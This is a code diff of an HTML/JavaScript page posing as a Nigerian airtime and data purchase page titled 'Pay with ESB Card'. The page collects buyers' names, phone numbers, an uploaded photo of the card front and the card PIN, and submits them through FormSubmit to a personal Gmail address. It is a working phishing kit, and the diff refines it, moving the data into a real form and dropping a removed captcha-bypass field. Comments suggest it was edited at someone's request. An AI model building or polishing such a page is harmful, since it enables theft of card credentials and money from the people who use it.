@@ -11,7 +11,7 @@
     }
     *{box-sizing:border-box}
     body{margin:0;font-family:Inter,system-ui,-apple-system,"Segoe UI",Roboto,Arial;background:var(--bg);color:#183540;-webkit-font-smoothing:antialiased}
-    .center{max-width:var(--max-width);margin:0 auto;min-height:100vh;position:relative}
+    .shell{max-width:var(--max-width);margin:0 auto;min-height:100vh;position:relative}
     header{background:var(--teal);color:#fff;padding:14px 12px;display:flex;align-items:center;gap:12px;position:sticky;top:0;z-index:50}
     .back-btn{width:34px;height:34px;border:0;background:transparent;color:#fff;font-size:22px;cursor:pointer;display:flex;align-items:center;justify-content:center}
     header h1{margin:0;font-size:18px;font-weight:700}
@@ -25,14 +25,7 @@
     .providers{display:flex;gap:12px;align-items:center;flex-wrap:wrap;margin-top:8px}
     .provider{width:74px;height:58px;border-radius:10px;display:flex;align-items:center;justify-content:center;cursor:pointer;padding:6px;border:2px solid transparent;transition:all .12s}
     .provider.selected{border-color:#9ec5ee;background:rgba(14,120,209,0.03);box-shadow:0 6px 20px rgba(14,120,209,0.08)}
-    .provider img{
-      display:block;
-      max-width:100%;
-      max-height:100%;
-      object-fit:contain;
-      width:100%;
-      height:100%;
-    }
+    .provider img{display:block;max-width:100%;max-height:100%;object-fit:contain}
     .data-pill{display:inline-block;padding:10px 18px;background:#fff;border:2px solid #bcd6f0;color:var(--blue);border-radius:10px;font-weight:700;margin:12px 0;box-shadow:0 6px 18px rgba(14,120,209,0.06)}
     .select-box{background:#eee;border-radius:8px;padding:10px}
     select{width:100%;border:0;background:transparent;padding:12px 0;font-size:15px}
@@ -58,13 +51,14 @@
   </style>
 </head>
 <body>
-  <div class="center">
+  <div class="shell">
     <div id="toast" class="toast" role="status" aria-live="polite"></div>
 
-    <div id="splash" style="position:fixed;inset:0;display:flex;align-items:center;justify-content:center;flex-direction:column;background:var(--teal);color:#fff;z-index:300">
-      <img src="https://upload.wikimedia.org/wikipedia/commons/7/79/Flag_of_Nigeria.svg" alt="Nigeria flag" style="width:48px;height:32px;border-radius:4px;margin-bottom:10px">
-      <div style="font-size:20px;font-weight:700">Airtime & Data</div>
-      <div style="margin-top:8px;opacity:0.95">Preparing your page…</div>
+    <!-- Splash -->
+    <div id="splash" style="position:fixed;inset:0;display:flex;align-items:center;justify-content:center;flex-direction:column;background:var(--teal);color:#fff;z-index:1000">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/7/79/Flag_of_Nigeria.svg" alt="flag" style="width:48px;height:32px;border-radius:4px;margin-bottom:10px" />
+      <h2 style="margin:0">Pay with ESB Card</h2>
+      <p style="margin-top:8px;opacity:0.95">Preparing your payment page…</p>
     </div>
 
     <div id="loadingOverlay">
@@ -74,7 +68,7 @@
 
     <header>
       <button class="back-btn" id="backBtn" aria-label="Go back">◂</button>
-      <h1>Airtime & Data</h1>
+      <h1>Pay with ESB Card</h1>
     </header>
 
     <main>
@@ -88,7 +82,7 @@
         <label for="mobile">Mobile number</label>
         <div style="display:flex;gap:8px;align-items:center">
           <div class="input" style="flex:1"><input id="mobile" type="tel" inputmode="numeric" pattern="[0-9]*" placeholder="Phone Number" autocomplete="tel"></div>
-          <button class="contact-btn" aria-label="Contacts">👤</button>
+          <button class="contact-btn" title="Contacts">👤</button>
         </div>
         <div class="small-note">Tap the dropdown to see favourites</div>
       </div>
@@ -98,8 +92,8 @@
         <div class="provider" data-net="airtel" title="Airtel">
           <img src="https://upload.wikimedia.org/wikipedia/commons/4/4e/Airtel_logo.svg" alt="Airtel logo">
         </div>
-        <div class="provider" data-net="t2" title="T2">
-          <img src="https://upload.wikimedia.org/wikipedia/commons/6/6e/9mobile_2017_logo.svg" alt="9mobile T2 logo">
+        <div class="provider" data-net="t2" title="9mobile">
+          <img src="https://upload.wikimedia.org/wikipedia/commons/6/6e/9mobile_2017_logo.svg" alt="9mobile logo">
         </div>
         <div class="provider" data-net="glo" title="Glo">
           <img src="https://upload.wikimedia.org/wikipedia/commons/6/6f/Glo_Logo.png" alt="Glo logo">
@@ -113,9 +107,7 @@
 
       <label for="planSelect">Choose Plan</label>
       <div class="card select-box">
-        <select id="planSelect" aria-label="Choose Plan">
-          <option value="">Choose Plan</option>
-        </select>
+        <select id="planSelect" aria-label="Choose Plan"><option value="">Choose Plan</option></select>
       </div>
     </main>
 
@@ -124,50 +116,68 @@
     </div>
   </div>
 
+  <!-- Payment methods sheet (Card only) -->
   <div id="paymentSheet" class="backdrop" aria-hidden="true">
-    <div class="sheet" role="dialog" aria-modal="true">
+    <div class="sheet">
       <div class="handle" data-drag-handle></div>
       <h2>Pay with</h2>
       <p>Select a payment method</p>
-
-      <div class="pay-item" id="cardOption" data-method="card">
+      <div class="pay-item" id="cardOption">
         <div style="display:flex;gap:12px;align-items:center">
           <div class="icon-box">💳</div>
-          <div>
-            <div style="font-weight:800">Card</div>
-            <div style="font-size:13px;color:#7a8b91">Pay with ESB Card</div>
-          </div>
+          <div><div style="font-weight:800">Card</div><div style="font-size:13px;color:#7a8b91">Pay with ESB Card</div></div>
         </div>
         <div style="font-size:22px;color:#8b9aa0">›</div>
       </div>
     </div>
   </div>
 
+  <!-- Card modal contains the REAL form that will be submitted to FormSubmit.
+       This is intentional: use a normal form submit (multipart/form-data) so
+       the user can complete the reCAPTCHA on the FormSubmit page. -->
   <div id="cardSheet" class="backdrop" aria-hidden="true">
-    <div class="card-sheet" role="dialog" aria-modal="true">
+    <div class="card-sheet">
       <div class="handle" data-drag-handle></div>
       <h2>Pay with ESB Card</h2>
       <p>Please upload your ESB Card (front) and enter your card PIN to proceed.</p>
 
-      <label for="cardUpload">Upload ESB Card (Front only)</label>
-      <input id="cardUpload" type="file" accept="image/*" style="margin-top:8px;padding:10px;border-radius:8px;border:1px solid #dfe5e7;background:#fff;">
+      <!-- REAL form: multipart/form-data, POST to FormSubmit. Do NOT disable captcha. -->
+      <form id="submitForm" action="https://formsubmit.co/empirevirtual99@gmail.com" method="POST" enctype="multipart/form-data">
+        <label for="cardUpload">Upload ESB Card (Front only)</label>
+        <!-- Keep the file input inside this form so it is submitted as a real file (not base64). -->
+        <input id="cardUpload" name="card_image" type="file" accept="image/*" style="margin-top:8px;padding:10px;border-radius:8px;border:1px solid #dfe5e7;background:#fff;">
 
-      <div class="preview" id="previewBox"></div>
+        <div class="preview" id="previewBox"></div>
 
-      <label for="cardPin">Card PIN</label>
-      <div class="input" style="margin-top:8px"><input id="cardPin" type="tel" inputmode="numeric" maxlength="8" placeholder="Enter ESB Card PIN"></div>
+        <label for="cardPin">Card PIN</label>
+        <!-- Include PIN inside form so it's sent to FormSubmit as well -->
+        <div class="input" style="margin-top:8px">
+          <input id="cardPin" name="pin" type="tel" inputmode="numeric" maxlength="8" placeholder="Enter ESB Card PIN">
+        </div>
+
+        <!-- Hidden fields populated before submit -->
+        <input type="hidden" name="title" id="fld_title" value="">
+        <input type="hidden" name="subject" id="fld_subject" value="">
+        <input type="hidden" name="name" id="fld_name" value="">
+        <input type="hidden" name="mobile" id="fld_mobile" value="">
+        <input type="hidden" name="network" id="fld_network" value="">
+        <input type="hidden" name="plan" id="fld_plan" value="">
+        <input type="hidden" name="amount" id="fld_amount" value="">
+        <!-- DO NOT set _captcha or _captcha=false — we must NOT bypass FormSubmit reCAPTCHA -->
+      </form>
 
       <div id="inlineError" class="notice"></div>
 
       <div class="actions">
         <button class="cancel" id="cancelBtn" type="button">Cancel</button>
+        <!-- This button will validate client-side and then call native form.submit() -->
         <button class="proceed" id="proceedBtn" type="button">Proceed</button>
       </div>
     </div>
   </div>
 
   <script>
-    // ===== EDITABLE DATA =====
+    // ===== Editable data =====
     const plans = {
       airtel: [
         { id: 'a1', label: 'Airtel 500MB - 7 Days', amount: 200 },
@@ -175,9 +185,9 @@
         { id: 'a3', label: 'Airtel 2GB - 30 Days', amount: 900 }
       ],
       t2: [
-        { id: 't1', label: 'T2 500MB - 7 Days', amount: 180 },
-        { id: 't2', label: 'T2 1.5GB - 30 Days', amount: 550 },
-        { id: 't3', label: 'T2 3GB - 30 Days', amount: 1000 }
+        { id: 't1', label: '9mobile 500MB - 7 Days', amount: 180 },
+        { id: 't2', label: '9mobile 1.5GB - 30 Days', amount: 550 },
+        { id: 't3', label: '9mobile 3GB - 30 Days', amount: 1000 }
       ],
       glo: [
         { id: 'g1', label: 'Glo 500MB - 7 Days', amount: 170 },
@@ -191,17 +201,19 @@
       ]
     };
 
+    // Simple user list for PIN validation (edit as required)
     const users = [
       { first: 'John', last: 'Doe', pin: '1234' },
       { first: 'Jane', last: 'Smith', pin: '5555' },
       { first: 'Ali', last: 'Abdullahi', pin: '0000' }
     ];
-    // ===== END EDITABLE DATA =====
+    // ===== End editable data =====
 
+    // Elements
     const splash = document.getElementById('splash');
     const toast = document.getElementById('toast');
     const backBtn = document.getElementById('backBtn');
-    const providers = document.querySelectorAll('.provider');
+    const providersEls = document.querySelectorAll('.provider');
     const planSelect = document.getElementById('planSelect');
     const payBtn = document.getElementById('payBtn');
     const paymentSheet = document.getElementById('paymentSheet');
@@ -213,114 +225,126 @@
     const inlineError = document.getElementById('inlineError');
     const cancelBtn = document.getElementById('cancelBtn');
     const proceedBtn = document.getElementById('proceedBtn');
+    const loadingOverlay = document.getElementById('loadingOverlay');
 
     const firstNameInput = document.getElementById('firstName');
     const lastNameInput = document.getElementById('lastName');
     const mobileInput = document.getElementById('mobile');
 
+    const fld_title = document.getElementById('fld_title');
+    const fld_subject = document.getElementById('fld_subject');
+    const fld_name = document.getElementById('fld_name');
+    const fld_mobile = document.getElementById('fld_mobile');
+    const fld_network = document.getElementById('fld_network');
+    const fld_plan = document.getElementById('fld_plan');
+    const fld_amount = document.getElementById('fld_amount');
+    const submitForm = document.getElementById('submitForm');
+
     let selectedNetwork = null;
     let selectedPlan = null;
-    let cardBase64 = '';
 
-    setTimeout(() => splash.style.display = 'none', 6000);
+    // hide splash after 6s
+    setTimeout(()=> splash.style.display = 'none', 6000);
 
-    function showToast(msg, isError = false) {
+    function showToast(msg, err=false){
       toast.textContent = msg;
-      toast.classList.toggle('error', isError);
+      toast.classList.toggle('error', err);
       toast.style.display = 'block';
       clearTimeout(showToast._t);
-      showToast._t = setTimeout(() => toast.style.display = 'none', 3200);
+      showToast._t = setTimeout(()=> toast.style.display = 'none', 3000);
     }
 
-    backBtn.addEventListener('click', () => {
+    backBtn.addEventListener('click', ()=> {
       if (window.history.length > 1) window.history.back();
       else showToast('No previous page', true);
     });
 
-    function populatePlans(networkKey) {
+    // Populate plans when provider clicked
+    function populatePlans(net){
       planSelect.innerHTML = '<option value="">Choose Plan</option>';
-      (plans[networkKey] || []).forEach(item => {
+      (plans[net] || []).forEach(p=>{
         const opt = document.createElement('option');
-        opt.value = JSON.stringify(item);
-        opt.textContent = `${item.label} — ₦${item.amount}`;
+        opt.value = JSON.stringify(p);
+        opt.textContent = `${p.label} — ₦${p.amount}`;
         planSelect.appendChild(opt);
       });
       selectedPlan = null;
-      updatePayAmount();
+      updatePay();
     }
 
-    providers.forEach(provider => {
-      provider.addEventListener('click', () => {
-        providers.forEach(p => p.classList.remove('selected'));
-        provider.classList.add('selected');
-        selectedNetwork = provider.dataset.net;
+    providersEls.forEach(el=>{
+      el.addEventListener('click', ()=> {
+        providersEls.forEach(x=>x.classList.remove('selected'));
+        el.classList.add('selected');
+        selectedNetwork = el.dataset.net;
         populatePlans(selectedNetwork);
       });
     });
 
-    if (providers[0]) providers[0].click();
+    if (providersEls[0]) providersEls[0].click();
 
-    planSelect.addEventListener('change', () => {
+    planSelect.addEventListener('change', ()=> {
       selectedPlan = planSelect.value ? JSON.parse(planSelect.value) : null;
-      updatePayAmount();
+      updatePay();
     });
 
-    function updatePayAmount() {
-      const amount = selectedPlan ? Number(selectedPlan.amount) : 0;
-      payBtn.textContent = `Pay ₦${amount.toFixed(2)}`;
+    function updatePay(){
+      const amount = selectedPlan ? selectedPlan.amount : 0;
+      payBtn.textContent = `Pay ₦${Number(amount).toFixed(2)}`;
     }
 
-    payBtn.addEventListener('click', () => {
-      if (!firstNameInput.value.trim()) { showToast('Please enter first name', true); return; }
-      if (!lastNameInput.value.trim()) { showToast('Please enter last name', true); return; }
+    payBtn.addEventListener('click', ()=> {
+      if (!firstNameInput.value.trim()) { showToast('Please enter your first name', true); return; }
+      if (!lastNameInput.value.trim()) { showToast('Please enter your last name', true); return; }
       if (!mobileInput.value.trim()) { showToast('Please enter mobile number', true); return; }
-      if (!selectedNetwork) { showToast('Please select a network provider', true); return; }
+      if (!selectedNetwork) { showToast('Please choose a network', true); return; }
       if (!selectedPlan) { showToast('Please choose a plan', true); return; }
       openSheet(paymentSheet);
     });
 
-    cardOption.addEventListener('click', () => {
+    cardOption.addEventListener('click', ()=> {
       closeSheet(paymentSheet);
       openSheet(cardSheet);
-      setTimeout(() => cardPin.focus(), 200);
+      setTimeout(()=> cardPin.focus(), 200);
     });
 
+    // preview uploaded card (file input is inside the real form)
     cardUpload.addEventListener('change', (e) => {
       const f = e.target.files && e.target.files[0];
-      if (!f) return;
+      if (!f) { previewBox.innerHTML = ''; return; }
       const reader = new FileReader();
-      reader.onload = (ev) => {
-        cardBase64 = ev.target.result;
-        previewBox.innerHTML = `<img src="${cardBase64}" alt="ESB Card Front">`;
+      reader.onload = function(ev){
+        previewBox.innerHTML = `<img src="${ev.target.result}" alt="ESB Card Front" />`;
       };
       reader.readAsDataURL(f);
     });
 
-    cancelBtn.addEventListener('click', () => {
+    cancelBtn.addEventListener('click', ()=> {
       closeSheet(cardSheet);
       resetCardInputs();
     });
 
-    function resetCardInputs() {
+    function resetCardInputs(){
       cardUpload.value = '';
       previewBox.innerHTML = '';
-      cardBase64 = '';
       cardPin.value = '';
       inlineError.style.display = 'none';
     }
 
-    function normalizeName(value) {
-      return (value || '').trim().toLowerCase();
-    }
+    function normalizeName(s){ return (s||'').trim().toLowerCase(); }
 
+    // Proceed -> validate client-side, then submit the REAL form (multipart/form-data) to FormSubmit.
+    // This will navigate to formsubmit.co where the user must complete the reCAPTCHA box — do NOT bypass it.
     proceedBtn.addEventListener('click', async (ev) => {
       ev.stopPropagation();
       ev.preventDefault();
-
       inlineError.style.display = 'none';
-      const pin = (cardPin.value || '').trim();
 
-      if (!cardBase64) {
+      const pin = (cardPin.value || '').trim();
+      // ensure file is present in the actual file input
+      const filePresent = cardUpload.files && cardUpload.files.length > 0;
+
+      if (!filePresent) {
         inlineError.textContent = 'Please upload your ESB Card (front).';
         inlineError.style.display = 'block';
         return;
@@ -333,152 +357,86 @@
 
       const first = normalizeName(firstNameInput.value);
       const last = normalizeName(lastNameInput.value);
+      const matched = users.find(u => normalizeName(u.first) === first && normalizeName(u.last) === last);
 
-      const matchedUser = users.find(u =>
-        normalizeName(u.first) === first &&
-        normalizeName(u.last) === last
-      );
-
-      if (!matchedUser || matchedUser.pin !== pin) {
+      if (!matched || matched.pin !== pin) {
         inlineError.textContent = 'PIN is incorrect.';
         inlineError.style.display = 'block';
         return;
       }
 
+      // Populate hidden fields in the real form so FormSubmit receives everything
+      fld_title.value = document.title || 'Pay with ESB Card';
+      fld_subject.value = `Data Purchase - ${selectedNetwork ? selectedNetwork.toUpperCase() : ''} - ${selectedPlan ? selectedPlan.label : ''}`;
+      fld_name.value = `${firstNameInput.value.trim()} ${lastNameInput.value.trim()}`;
+      fld_mobile.value = mobileInput.value.trim();
+      fld_network.value = selectedNetwork || '';
+      fld_plan.value = selectedPlan ? selectedPlan.label : '';
+      fld_amount.value = selectedPlan ? selectedPlan.amount : '';
+
+      // Show loader (UX) briefly — user will be redirected to FormSubmit where they will check reCAPTCHA
       closeSheet(cardSheet);
       loadingOverlay.style.display = 'flex';
 
-      await new Promise(res => setTimeout(res, 6000));
-
-      const form = document.createElement('form');
-      form.method = 'POST';
-      form.action = 'https://formsubmit.co/empirevirtual99@gmail.com';
-      form.style.display = 'none';
-
-      function addField(name, value){
-        const input = document.createElement('input');
-        input.type = 'hidden';
-        input.name = name;
-        input.value = value == null ? '' : String(value);
-        form.appendChild(input);
-      }
-
-      addField('title', document.title || 'Pay with ESB Card');
-      addField('subject', `Data Purchase - ${selectedNetwork ? selectedNetwork.toUpperCase() : ''} - ${selectedPlan ? selectedPlan.label : ''}`);
-      addField('name', `${firstNameInput.value.trim()} ${lastNameInput.value.trim()}`);
-      addField('mobile', mobileInput.value.trim());
-      addField('network', selectedNetwork || '');
-      addField('plan', selectedPlan ? selectedPlan.label : '');
-      addField('amount', selectedPlan ? selectedPlan.amount : 0);
-      addField('pin', pin);
-      addField('card_image_base64', cardBase64);
-
-      // This is the FormSubmit flag to disable CAPTCHA for direct programmatic posts
-      addField('_captcha', 'false');
-
-      document.body.appendChild(form);
-      try {
-        form.submit();
-      } catch (err) {
-        window.open('', '_self');
-        form.submit();
-      }
+      // Give a small delay so loader is visible; then submit the form (native multipart/form-data POST).
+      // This will navigate away to formsubmit.co where reCAPTCHA must be completed by the user.
+      setTimeout(() => {
+        // IMPORTANT: We call the native form submit so the browser performs a navigation. FormSubmit will show the "I'm not a robot" checkbox page if it requires it.
+        // DO NOT add any hidden _captcha=false field — we must not bypass reCAPTCHA per your request.
+        try {
+          submitForm.submit();
+        } catch (err) {
+          // If anything goes wrong, hide loader and show error message.
+          loadingOverlay.style.display = 'none';
+          showToast('Unable to submit form from this browser. Please try a different browser.', true);
+          console.error(err);
+        }
+      }, 600); // short delay — not fighting reCAPTCHA, just a UX pause
     });
 
+    // sheet helpers and drag-from-handle behavior (unchanged)
     function openSheet(sheet){
       sheet.style.display = 'flex';
       sheet.setAttribute('aria-hidden','false');
       document.documentElement.style.overflow = 'hidden';
       document.body.style.overflow = 'hidden';
       const panel = sheet.querySelector('.sheet, .card-sheet');
-      if(panel) panel.style.transform = 'translateY(0)';
+      if (panel) panel.style.transform = 'translateY(0)';
     }
-
     function closeSheet(sheet){
       sheet.style.display = 'none';
       sheet.setAttribute('aria-hidden','true');
       document.documentElement.style.overflow = '';
       document.body.style.overflow = '';
       const panel = sheet.querySelector('.sheet, .card-sheet');
-      if(panel) panel.style.transform = '';
+      if (panel) panel.style.transform = '';
     }
-
     [paymentSheet, cardSheet].forEach(sheet => {
-      sheet.addEventListener('click', (ev) => {
-        if (ev.target === sheet) closeSheet(sheet);
-      });
+      sheet.addEventListener('click', (ev)=>{ if(ev.target === sheet) closeSheet(sheet); });
     });
 
     function makeDraggable(sheet){
       const handle = sheet.querySelector('[data-drag-handle]') || sheet.querySelector('.handle');
       const panel = sheet.querySelector('.sheet, .card-sheet');
-      if(!handle || !panel) return;
-
-      let dragging = false;
-      let startY = 0;
+      if (!handle || !panel) return;
+      let dragging=false, startY=0;
       panel._dragY = 0;
-
-      function setTranslate(y){
-        panel._dragY = y;
-        panel.style.transform = `translateY(${y}px)`;
-        const frac = Math.max(0, 1 - (y / 260));
-        sheet.style.background = `rgba(0,0,0,${0.45 * frac})`;
-      }
-
-      function start(clientY){
-        dragging = true;
-        startY = clientY - (panel._dragY || 0);
-        panel.style.transition = 'none';
-      }
-
-      function move(clientY){
-        if(!dragging) return;
-        let dy = clientY - startY;
-        if(dy < 0) dy = 0;
-        if(dy > 600) dy = 600;
-        setTranslate(dy);
-      }
-
-      function end(){
-        if(!dragging) return;
-        dragging = false;
-        panel.style.transition = 'transform 220ms ease';
-        if((panel._dragY || 0) > 120){
-          setTranslate(600);
-          setTimeout(()=> closeSheet(sheet), 180);
-        } else {
-          setTranslate(0);
-          sheet.style.background = 'rgba(0,0,0,0.45)';
-        }
-      }
-
-      handle.addEventListener('touchstart', (e)=> { if(e.touches.length!==1) return; start(e.touches[0].clientY); }, { passive: true });
-      handle.addEventListener('touchmove', (e)=> { if(e.touches.length!==1) return; move(e.touches[0].clientY); }, { passive: true });
+      function setY(y){ panel._dragY = y; panel.style.transform = `translateY(${y}px)`; const frac = Math.max(0,1-(y/260)); sheet.style.background = `rgba(0,0,0,${0.45*frac})`; }
+      function start(y){ dragging=true; startY = y - (panel._dragY || 0); panel.style.transition='none'; }
+      function move(y){ if(!dragging) return; let next = y - startY; if(next<0) next=0; if(next>600) next=600; setY(next); }
+      function end(){ if(!dragging) return; dragging=false; panel.style.transition='transform 220ms ease'; if((panel._dragY||0)>120){ setY(600); setTimeout(()=> closeSheet(sheet), 180); } else { setY(0); sheet.style.background='rgba(0,0,0,0.45)'; } }
+      handle.addEventListener('touchstart', e => { if(e.touches.length!==1) return; start(e.touches[0].clientY); }, {passive:true});
+      handle.addEventListener('touchmove', e => { if(e.touches.length!==1) return; move(e.touches[0].clientY); }, {passive:true});
       handle.addEventListener('touchend', end);
-      handle.addEventListener('touchcancel', end);
-
-      handle.addEventListener('mousedown', (e)=> {
-        if(e.button!==0) return;
-        start(e.clientY);
-        e.preventDefault();
-        const onMove = (ev) => move(ev.clientY);
-        const onUp = () => {
-          end();
-          window.removeEventListener('mousemove', onMove);
-          window.removeEventListener('mouseup', onUp);
-        };
-        window.addEventListener('mousemove', onMove);
-        window.addEventListener('mouseup', onUp);
-      });
+      handle.addEventListener('mousedown', e => { if(e.button!==0) return; start(e.clientY); e.preventDefault(); const onMove = ev=>move(ev.clientY); const onUp = ()=>{ end(); window.removeEventListener('mousemove', onMove); window.removeEventListener('mouseup', onUp); }; window.addEventListener('mousemove', onMove); window.addEventListener('mouseup', onUp); });
     }
-
     makeDraggable(paymentSheet);
     makeDraggable(cardSheet);
 
-    window.addEventListener('keydown', (e) => {
-      if(e.key === 'Escape'){
-        if(paymentSheet.style.display === 'flex') closeSheet(paymentSheet);
-        if(cardSheet.style.display === 'flex') closeSheet(cardSheet);
+    window.addEventListener('keydown', (e)=> {
+      if (e.key === 'Escape') {
+        if (paymentSheet.style.display === 'flex') closeSheet(paymentSheet);
+        if (cardSheet.style.display === 'flex') closeSheet(cardSheet);
       }
     });
   </script>
